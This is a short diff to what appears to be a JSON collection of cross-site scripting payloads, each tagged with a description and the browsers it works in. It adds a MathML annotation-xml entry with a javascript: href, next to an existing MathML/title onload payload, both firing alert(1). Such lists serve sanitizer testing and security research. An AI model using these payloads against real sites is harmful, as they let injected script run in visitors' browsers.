@@ -43,5 +43,10 @@
     "description": "Math title and body",
     "code": "<math><title><body onload=alert(1)></title></math>",
     "browsers": ["chrome", "firefox", "edge", "safari"]
+  },
+  {
+    "description": "Math with annotation href",
+    "code": "<math><annotation-xml encoding=text/html href=javascript:alert(1) style=display:block><span>XSS</span></annotation-xml></math>",
+    "browsers": ["firefox", "safari"]
   }
 ]
